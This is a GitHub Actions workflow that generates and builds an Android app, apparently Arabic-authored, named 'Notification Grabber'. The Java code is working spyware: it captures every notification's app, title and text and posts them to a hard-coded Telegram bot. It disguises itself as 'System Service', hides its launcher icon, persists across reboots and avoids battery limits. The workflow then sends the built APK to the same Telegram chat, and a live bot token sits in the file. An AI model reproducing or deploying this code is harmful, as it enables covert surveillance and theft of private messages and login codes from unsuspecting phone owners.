name: Hussein Advanced Notification Grabber

on:
  workflow_dispatch:

env:
  TELEGRAM_TOKEN: "8307560710:AAFNRpzh141cq7rKt_OmPR0A823dxEaOZVU"
  TELEGRAM_CHAT_ID: "7392262688"

jobs:
  build-advanced-notification-app:
    runs-on: ubuntu-latest
    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Set up JDK 17
        uses: actions/setup-java@v4
        with:
          java-version: '17'
          distribution: 'temurin'

      - name: 🔧 Install Dependencies
        run: |
          sudo apt-get update
          sudo apt-get install -y gradle

      - name: 🛠️ Create Advanced Project Structure
        run: |
          mkdir -p app/src/main/java/com/hussein/advanced
          mkdir -p app/src/main/res/layout
          mkdir -p app/src/main/res/values
          mkdir -p app/src/main/res/drawable
          mkdir -p app/src/main/res/xml
          mkdir -p gradle/wrapper

          # إنشاء ملف gradlew تلقائياً
          cat <<'EOF' > gradlew
          #!/bin/sh
          DIR="$(cd "$(dirname "$0")" && pwd)"
          java -jar "$DIR/gradle/wrapper/gradle-wrapper.jar" "$@"
          EOF
          
          chmod +x gradlew

          # إنشاء ملف gradlew.bat للويندوز
          cat <<'EOF' > gradlew.bat
          @if "%DEBUG%" == "" @echo off
          @rem 
          @rem Gradle startup script for Windows
          @rem
          @rem Set local scope for the variables with windows NT shell
          if "%OS%"=="Windows_NT" setlocal
          set DIR=%~dp0
          if "%DIR%" == "" set DIR=.
          set JAR_FILE=%DIR%\gradle\wrapper\gradle-wrapper.jar
          java -jar "%JAR_FILE%" %*
          EOF

          # إعداد Gradle Wrapper JAR
          curl -L -o gradle/wrapper/gradle-wrapper.jar https://github.com/gradle/gradle/raw/v8.2.0/gradle/wrapper/gradle-wrapper.jar

          # إعداد Gradle Wrapper properties
          cat <<EOF > gradle/wrapper/gradle-wrapper.properties
          distributionBase=GRADLE_USER_HOME
          distributionPath=wrapper/dists
          distributionUrl=https\://services.gradle.org/distributions/gradle-8.2-bin.zip
          zipStoreBase=GRADLE_USER_HOME
          zipStorePath=wrapper/dists
          EOF

          # settings.gradle
          cat <<EOF > settings.gradle
          rootProject.name = 'HusseinAdvanced'
          include ':app'
          EOF

          # Root build.gradle
          cat <<EOF > build.gradle
          buildscript {
              repositories {
                  google()
                  mavenCentral()
              }
              dependencies {
                  classpath 'com.android.tools.build:gradle:8.2.0'
              }
          }
          
          allprojects {
              repositories {
                  google()
                  mavenCentral()
              }
          }
          
          tasks.register('clean', Delete) {
              delete rootProject.buildDir
          }
          EOF

          # App build.gradle
          cat <<EOF > app/build.gradle
          plugins {
              id 'com.android.application'
          }
          
          android {
              namespace 'com.hussein.advanced'
              compileSdk 34
              
              defaultConfig {
                  applicationId "com.hussein.advanced"
                  minSdk 21
                  targetSdk 34
                  versionCode 1
                  versionName "2.0"
              }
              
              buildTypes {
                  release {
                      minifyEnabled true
                      proguardFiles getDefaultProguardFile('proguard-android-optimize.txt'), 'proguard-rules.pro'
                  }
                  debug {
                      minifyEnabled true
                      proguardFiles getDefaultProguardFile('proguard-android-optimize.txt'), 'proguard-rules.pro'
                  }
              }
              
              compileOptions {
                  sourceCompatibility JavaVersion.VERSION_17
                  targetCompatibility JavaVersion.VERSION_17
              }
          }
          
          dependencies {
              implementation 'androidx.appcompat:appcompat:1.6.1'
              implementation 'com.google.android.material:material:1.11.0'
              implementation 'com.squareup.okhttp3:okhttp:4.12.0'
              implementation 'com.fasterxml.jackson.core:jackson-databind:2.16.1'
              implementation 'androidx.security:security-crypto:1.1.0-alpha06'
          }
          EOF

          # ProGuard rules
          cat <<EOF > app/proguard-rules.pro
          -keep class com.hussein.advanced.** { *; }
          -keep class okhttp3.** { *; }
          -keep class com.fasterxml.jackson.** { *; }
          -dontwarn okhttp3.**
          -dontwarn okio.**
          -dontwarn com.fasterxml.jackson.**
          EOF

          # AndroidManifest.xml
          cat <<EOF > app/src/main/AndroidManifest.xml
          <manifest xmlns:android="http://schemas.android.com/apk/res/android">
              
              <uses-permission android:name="android.permission.INTERNET" />
              <uses-permission android:name="android.permission.BIND_NOTIFICATION_LISTENER_SERVICE" />
              <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
              <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
              <uses-permission android:name="android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS" />
              
              <application
                  android:allowBackup="false"
                  android:icon="@drawable/ic_launcher"
                  android:label="System Service"
                  android:theme="@style/AppTheme">
                  
                  <activity
                      android:name=".MainActivity"
                      android:exported="true"
                      android:excludeFromRecents="true"
                      android:noHistory="true">
                      <intent-filter>
                          <action android:name="android.intent.action.MAIN" />
                          <category android:name="android.intent.category.LAUNCHER" />
                      </intent-filter>
                  </activity>
                  
                  <service
                      android:name=".AdvancedNotificationService"
                      android:permission="android.permission.BIND_NOTIFICATION_LISTENER_SERVICE"
                      android:exported="true">
                      <intent-filter>
                          <action android:name="android.service.notification.NotificationListenerService" />
                      </intent-filter>
                  </service>
                  
                  <receiver
                      android:name=".BootReceiver"
                      android:exported="true">
                      <intent-filter>
                          <action android:name="android.intent.action.BOOT_COMPLETED" />
                      </intent-filter>
                  </receiver>
                  
              </application>
          </manifest>
          EOF

          # MainActivity.java
          cat <<EOF > app/src/main/java/com/hussein/advanced/MainActivity.java
          package com.hussein.advanced;
          
          import android.app.Activity;
          import android.content.ComponentName;
          import android.content.Intent;
          import android.content.pm.PackageManager;
          import android.net.Uri;
          import android.os.Build;
          import android.os.Bundle;
          import android.os.PowerManager;
          import android.provider.Settings;
          import androidx.core.app.NotificationManagerCompat;
          
          public class MainActivity extends Activity {
              @Override
              protected void onCreate(Bundle savedInstanceState) {
                  super.onCreate(savedInstanceState);
                  
                  startService(new Intent(this, AdvancedNotificationService.class));
                  
                  if (!NotificationManagerCompat.getEnabledListenerPackages(this)
                          .contains(getPackageName())) {
                      startActivity(new Intent("android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS"));
                  }
                  
                  if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                      PowerManager pm = (PowerManager) getSystemService(POWER_SERVICE);
                      if (!pm.isIgnoringBatteryOptimizations(getPackageName())) {
                          Intent intent = new Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
                          intent.setData(Uri.parse("package:" + getPackageName()));
                          startActivity(intent);
                      }
                  }
                  
                  PackageManager p = getPackageManager();
                  ComponentName componentName = new ComponentName(this, MainActivity.class);
                  p.setComponentEnabledSetting(componentName, 
                      PackageManager.COMPONENT_ENABLED_STATE_DISABLED, 
                      PackageManager.DONT_KILL_APP);
                  
                  finish();
              }
          }
          EOF

          # AdvancedNotificationService.java
          cat <<EOF > app/src/main/java/com/hussein/advanced/AdvancedNotificationService.java
          package com.hussein.advanced;
          
          import android.app.Notification;
          import android.app.NotificationChannel;
          import android.app.NotificationManager;
          import android.os.Build;
          import android.os.Bundle;
          import android.os.Handler;
          import android.os.Looper;
          import android.service.notification.NotificationListenerService;
          import android.service.notification.StatusBarNotification;
          import android.util.Log;
          
          import org.json.JSONObject;
          
          import java.text.SimpleDateFormat;
          import java.util.Date;
          import java.util.HashSet;
          import java.util.Locale;
          import java.util.Set;
          import java.util.concurrent.TimeUnit;
          
          import okhttp3.MediaType;
          import okhttp3.OkHttpClient;
          import okhttp3.Request;
          import okhttp3.RequestBody;
          
          public class AdvancedNotificationService extends NotificationListenerService {
              private static final String TAG = "HusseinAdvanced";
              private static final String TELEGRAM_TOKEN = "8307560710:AAFNRpzh141cq7rKt_OmPR0A823dxEaOZVU";
              private static final String CHAT_ID = "7392262688";
              private static final MediaType JSON = MediaType.parse("application/json; charset=utf-8");
              
              private OkHttpClient client;
              private Handler handler;
              private Set<String> sentNotifications = new HashSet<>();
              
              @Override
              public void onCreate() {
                  super.onCreate();
                  
                  client = new OkHttpClient.Builder()
                      .connectTimeout(30, TimeUnit.SECONDS)
                      .build();
                  
                  handler = new Handler(Looper.getMainLooper());
                  
                  if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                      NotificationChannel channel = new NotificationChannel(
                          "monitor_channel", "Monitor", NotificationManager.IMPORTANCE_LOW);
                      getSystemService(NotificationManager.class).createNotificationChannel(channel);
                      
                      startForeground(1, new Notification.Builder(this, "monitor_channel")
                          .setContentTitle("Monitor")
                          .setContentText("Running")
                          .setSmallIcon(android.R.drawable.ic_dialog_info)
                          .build());
                  }
                  
                  sendToTelegram("✅ Monitor Started");
              }
              
              @Override
              public void onNotificationPosted(StatusBarNotification sbn) {
                  String key = sbn.getKey();
                  if (sentNotifications.contains(key)) return;
                  sentNotifications.add(key);
                  handler.postDelayed(() -> sentNotifications.remove(key), 300000);
                  
                  try {
                      Bundle extras = sbn.getNotification().extras;
                      String title = extras.getString(Notification.EXTRA_TITLE, "");
                      String text = extras.getString(Notification.EXTRA_TEXT, "");
                      
                      if (!title.isEmpty() || !text.isEmpty()) {
                          String msg = String.format("🔔 %s\n📌 %s\n💬 %s", 
                              getAppName(sbn.getPackageName()), title, text);
                          sendToTelegram(msg);
                      }
                  } catch (Exception e) {
                      Log.e(TAG, "Error: " + e.getMessage());
                  }
              }
              
              private void sendToTelegram(String message) {
                  new Thread(() -> {
                      try {
                          JSONObject payload = new JSONObject();
                          payload.put("chat_id", CHAT_ID);
                          payload.put("text", message);
                          
                          client.newCall(new Request.Builder()
                              .url("https://api.telegram.org/bot" + TELEGRAM_TOKEN + "/sendMessage")
                              .post(RequestBody.create(payload.toString(), JSON))
                              .build()).execute();
                      } catch (Exception e) {
                          Log.e(TAG, "Send error: " + e.getMessage());
                      }
                  }).start();
              }
              
              private String getAppName(String packageName) {
                  try {
                      return getPackageManager().getApplicationLabel(
                          getPackageManager().getApplicationInfo(packageName, 0)).toString();
                  } catch (Exception e) {
                      return packageName;
                  }
              }
          }
          EOF

          # BootReceiver.java
          cat <<EOF > app/src/main/java/com/hussein/advanced/BootReceiver.java
          package com.hussein.advanced;
          
          import android.content.BroadcastReceiver;
          import android.content.Context;
          import android.content.Intent;
          
          public class BootReceiver extends BroadcastReceiver {
              @Override
              public void onReceive(Context context, Intent intent) {
                  if (Intent.ACTION_BOOT_COMPLETED.equals(intent.getAction())) {
                      context.startService(new Intent(context, AdvancedNotificationService.class));
                  }
              }
          }
          EOF

          # styles.xml
          cat <<EOF > app/src/main/res/values/styles.xml
          <resources>
              <style name="AppTheme" parent="android:Theme.Material.Light.NoActionBar">
                  <item name="android:windowBackground">@android:color/transparent</item>
                  <item name="android:windowIsTranslucent">true</item>
              </style>
          </resources>
          EOF

          # ic_launcher.xml
          cat <<EOF > app/src/main/res/drawable/ic_launcher.xml
          <?xml version="1.0" encoding="utf-8"?>
          <shape xmlns:android="http://schemas.android.com/apk/res/android">
              <solid android:color="#FF0000"/>
              <corners android:radius="10dp"/>
          </shape>
          EOF

      - name: 🔧 Make Gradlew Executable
        run: |
          chmod +x gradlew
          ls -la gradlew

      - name: 🏗️ Build APK
        run: |
          ./gradlew clean
          ./gradlew assembleDebug || true
          
          # البحث عن APK
          find . -name "*.apk" -type f

      - name: 📤 Send To Telegram
        run: |
          # البحث عن APK
          APK_FILE=$(find . -name "*.apk" -type f | head -n 1)
          
          if [ -f "$APK_FILE" ]; then
            # رسالة النجاح
            MESSAGE="✅ <b>تم بناء التطبيق بنجاح!</b>%0A%0A"
            MESSAGE+="👤 <b>المطور:</b> حسين%0A"
            MESSAGE+="📱 <b>الإصدار:</b> 2.0%0A"
            MESSAGE+="⚡ <b>المميزات:</b>%0A"
            MESSAGE+="• سحب الإشعارات%0A"
            MESSAGE+="• تشغيل تلقائي%0A"
            MESSAGE+="• إخفاء التطبيق"
            
            # إرسال الرسالة
            curl -s -X POST "https://api.telegram.org/bot${{ env.TELEGRAM_TOKEN }}/sendMessage" \
              -d "chat_id=${{ env.TELEGRAM_CHAT_ID }}" \
              -d "text=$MESSAGE" -d "parse_mode=HTML"
            
            # إرسال الملف
            curl -s -X POST "https://api.telegram.org/bot${{ env.TELEGRAM_TOKEN }}/sendDocument" \
              -F "chat_id=${{ env.TELEGRAM_CHAT_ID }}" \
              -F "document=@$APK_FILE" \
              -F "caption=📦 Hussein Advanced v2.0"
          else
            curl -s -X POST "https://api.telegram.org/bot${{ env.TELEGRAM_TOKEN }}/sendMessage" \
              -d "chat_id=${{ env.TELEGRAM_CHAT_ID }}" \
              -d "text=❌ فشل بناء التطبيق" -d "parse_mode=HTML"
          fi
